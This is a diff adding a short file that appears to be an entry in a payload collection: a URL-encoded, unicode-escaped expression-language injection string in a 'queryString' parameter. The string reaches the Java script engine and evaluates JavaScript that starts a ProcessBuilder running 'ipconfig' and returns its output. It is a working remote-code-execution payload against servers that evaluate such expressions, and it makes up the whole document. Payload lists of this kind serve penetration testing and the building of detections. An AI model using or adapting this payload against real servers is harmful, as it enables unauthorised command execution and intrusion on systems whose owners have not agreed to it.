@@ -1,0 +1,4 @@
+queryString=\u0027%2b#{
+\u0022\u0022[\u0022class\u0022].forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022
+var x=new java.lang.ProcessBuilder;x.command(\u0027ipconfig\u0027);x.start();org.apache.commons.io.IOUtils.toString(x.start().getInputStream())
+\u0022)}%2b\u0027
